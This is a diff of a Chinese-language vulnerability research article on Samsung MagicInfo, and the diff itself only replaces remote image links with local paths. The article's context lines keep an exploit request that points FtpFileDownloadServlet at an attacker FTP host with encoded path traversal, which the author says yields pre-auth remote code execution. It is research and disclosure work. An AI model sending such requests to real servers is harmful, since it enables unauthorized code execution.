@@ -155,12 +155,12 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
 方法中 step into ArrayList.size  
 时，可以看到这里有 16 个 entries：  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSh9DbqH0PXAOsxKzKz71MdFncNzCYyBkUadRDe0WJkMZXNpSlekHIB85fTkDvQ1LXxUr2lGBRrNqHVzjiayRvjJ74qaJkhgk0ZA/640?wx_fmt=png&from=appmsg "A breakpoint to see the number of entries and their values")  
+![](../../.resource/remote/dcade6ebe1f07476c2aeeb2659fd79fa4fa070f554e5e0f35e3dbd6d2e090c85.png "A breakpoint to see the number of entries and their values")  
   
 ……并且这与数据库中 MI_RM_MAP_SERVICE_OPERATION  
 表里的条目数量相对应：  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSia7iazSzRp7m6PkQhwqicDPNo3O0oEWCQTMMZza4viaNHTNPmforEBToZMIUG8YLl7Uw6G5cQcM35vOAVdHUDmGCsQV2TmibbvjJSw/640?wx_fmt=png&from=appmsg "Checking the database for the number of entries")  
+![](../../.resource/remote/ac605fb1153e6800ad06801e0870370247993301b1040b0f27c961530d9e3ee1.png "Checking the database for the number of entries")  
   
 当在 com.samsung.magicinfo.protocol.interfaces.NOTIFYExecuter  
 类中拿到 service_id  
@@ -217,7 +217,7 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
   
 查看数据库可以看到这里有 54 条记录：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nShMAx0ibs4LmHvdI9SkOzgXeAsIMYx6pMhPQUJkJakBOYUNUWyYqUGcka8XKo0Kae0HiawkEo3upHSedpIjgcZtCwiaLkAzzQczCo/640?wx_fmt=png&from=appmsg "Service manager entries")  
+![](../../.resource/remote/fce1fbb5aab5c9fcc699ef56bfae306901e1d339421b181d205a3df086f6ad10.png "Service manager entries")  
   
 回到   
 11  
@@ -231,7 +231,7 @@ public class NOTIFYExecuter extends Executer { Logger logger = LoggingManagerV2.
 处返回。归根结底，我们可以用一条简单的 SQL 查询来汇总攻击面：它会列出 com.samsung.magicinfo.protocol.http.service.WSServlet  
 可用于处理传入请求的 manager classes。注意，这个攻击面是预认证可达的。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSiafb3ic5xkKOeia5d2ysE9hYtAPLewbvvhETibozibwA61Nj1rQQskGfNQSTranhBMJAImhPflj4vtIibXjsp7yN7VBFbnEokkjNLD8/640?wx_fmt=png&from=appmsg "Management classes")  
+![](../../.resource/remote/7d7f2204f2025b95b1bd3c4e5adad918881296f3f261a9ee55b69a624322cb56.png "Management classes")  
   
 例如，com.samsung.magicinfo.framework.device.service.upload.DeviceUploadServiceManager  
 类就清楚展示了由哪个 activity 来处理传入请求：  
@@ -369,7 +369,7 @@ POST /MagicInfo/restapi/v2.0/auth HTTP/1.1Host: [target]:7001Content-Type: appli
 在研究 CVE-2025-54438 时，我发现确实存在两个 downloadChangedFiles  
 方法，它们分别映射到对应的 servlet 类：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSgYMWRVS6ScUF2kuR3X9yriaImhGnJVdSL04RNkUSy9kibicRGSrhjkaJpgribv71cD86doUUJKfO7Saic3gMLjBNg4rX1PcnslnjB0/640?wx_fmt=png&from=appmsg "Analysing CVE-2025-54438")  
+![](../../.resource/remote/3ec10c86d0fc8c760b93de0e50ad9c0267e2dbabb41a3c27647368730557c592.png "Analysing CVE-2025-54438")  
 1. com.samsung.magicinfo.protocol.file.CifsFileDownloadServlet  
 1. com.samsung.magicinfo.protocol.file.FtpFileDownloadServlet  
 继续看代码可以发现：补丁后的 CifsFileDownloadServlet  
@@ -425,7 +425,7 @@ server 下载并再次覆盖index.html
 GET /MagicInfo/servlet/FtpFileDownloadServlet?ftpLoginId=user&ftpPassword=pwd&ftpIp=[attacker]&ftpPort=2121&ftpDirectory=test%5c..%5c..%5c..%5c..%5cserver%5c HTTP/1.1Host: [target]:7002Accept: application/json
 ```  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSjxKRzUc34gpqynyH9b1iboAt8hv3ibPVs7n0gsLUZdQz61uJmicz4CMOo5VYm9OapAjPAQHOIzp0ibzwUb8tW4FgeD6EVYo5l07fY/640?wx_fmt=png&from=appmsg "Triggering the CVE-2025-54438 variant!")  
+![](../../.resource/remote/4724a302899518ea3b790fdf616eb9f072d310615fdeee2d6b8dfdc40800444c.png "Triggering the CVE-2025-54438 variant!")  
   
 如果攻击者只是用 ftpLoginId  
 来做 traversal，最终会落到类似这样的路径：C:\MagicInfo Premium\runtime\upload\contents_home\FTP_192_168_18_137_user1_  
@@ -486,7 +486,7 @@ SELECT DISTINCT FILE_TYPE FROM MI_CMS_CODE_FILE WHERE (MEDIA_TYPE = 'IMAGE' OR M
   
 你可以在 这里 下载 poc。  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSiaW43IOjCUbfPVL7w4gQxLmtib6N8BaPUmF3BRWzHUdZBywhQiaXKIzGicb3u9rqvZHgj6PHtf2sib0wYqMcNYetpu9kHl3Dnp35A8/640?wx_fmt=png&from=appmsg "Getting pre-auth remote code execution")  
+![](../../.resource/remote/5746c48ea5270b0ac31d55a15a719548d358fe2988832b88d0e71b57bfb365e3.png "Getting pre-auth remote code execution")  
 ## 总结  
   
 这几天的 patch review 虽然很"燃"，但也确实让我挖出了更多高危 bug。感谢你一路读到这里；如果你喜欢这类内容，欢迎在 X 上联系我，让我知道这些东西不只是被没有灵魂的 AI 机器吞掉了。  
